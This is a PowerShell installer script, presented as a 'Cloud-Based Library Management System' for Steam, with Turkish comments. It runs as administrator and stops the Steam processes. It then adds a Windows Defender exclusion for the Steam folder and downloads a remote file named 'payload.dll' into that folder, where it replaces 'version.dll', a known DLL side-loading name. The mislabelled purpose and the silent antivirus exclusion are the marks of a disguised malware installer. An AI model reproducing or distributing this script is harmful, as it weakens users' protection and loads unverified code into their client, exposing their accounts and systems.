# LimeSniffers Installation Script - SteamTools Infrastructure Style
# Built for professional deployment

$ErrorActionPreference = "Stop"
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

function Show-Logo {
    Clear-Host
    Write-Host @"
  _      _                 _____       _  __  __                
 | |    (_)               / ____|     (_)/ _|/ _|               
 | |     _ _ __ ___   __| (___  _ __  _| |_| |_ ___ _ __ ___ 
 | |    | | '_ ` _ \ / _ \\___ \| '_ \| |  _|  _/ _ \ '__/ __|
 | |____| | | | | | |  __/____) | | | | | | | ||  __/ |  \__ \
 |______|_|_| |_| |_|\___|_____/|_| |_|_|_| |_| \___|_|  |___/
                                                                
    >>> Cloud-Based Library Management System <<<
"@ -ForegroundColor Green
}

function ForceStopProcess($processName) {
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host "[*] $processName sonlandırılıyor..." -ForegroundColor Yellow
        Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
}

function Remove-ItemIfExists($path) {
    if (Test-Path $path) {
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
}

# 1. Yönetici Kontrolü
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Lütfen bu betiği YÖNETİCİ olarak çalıştırın!" -ForegroundColor Red
    pause
    exit
}

Show-Logo

# 2. Steam'i ve Yardımcılarını Zorla Kapat
ForceStopProcess "Steam"
ForceStopProcess "steamwebhelper"
ForceStopProcess "SteamService"

# 3. Steam Yolunu Bul
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = ""

if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath)) {
    Write-Host "[-] Steam istemcisi bulunamadı. Lütfen Steam'i kurun." -ForegroundColor Red
    Start-Sleep 5
    exit
}

# 4. Temizlik ve Hazırlık
$dllPath = Join-Path $steamPath "LimeSniffers.dll"
$oldDll = Join-Path $steamPath "version.dll" # Eğer eski bir isim kullanıyorsan temizler
Remove-ItemIfExists $dllPath
Remove-ItemIfExists $oldDll

# 5. Güvenlik Duvarı/Antivirüs İstisnası (Opsiyonel ama tavsiye edilir)
try {
    Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
    Write-Host "[+] Defender istisnası eklendi." -ForegroundColor Gray
} catch {}

# 6. İndirme İşlemi
$dllUrl = "https://github.com/PromaxTheCoderx/LimeTools/releases/download/v1/payload.dll"

try {
    Write-Host "[*] LimeSniffers DLL indiriliyor..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing
    Write-Host "[+] Dosya başarıyla konumlandırıldı: $dllPath" -ForegroundColor Green
} catch {
    Write-Host "[-] İndirme hatası! Manuel kurulum gerekebilir." -ForegroundColor Red
    pause
    exit
}

# 7. Final: Steam'i Başlat ve Kapat
Write-Host "[+] Kurulum tamamlandı. Steam başlatılıyor..." -ForegroundColor Green
$steamExe = Join-Path $steamPath "steam.exe"
Start-Process $steamExe

for ($i = 5; $i -ge 0; $i--) {
    Write-Host "`r[Pencere $i saniye içinde kapanacak...]" -NoNewline
    Start-Sleep -Seconds 1
}

exit
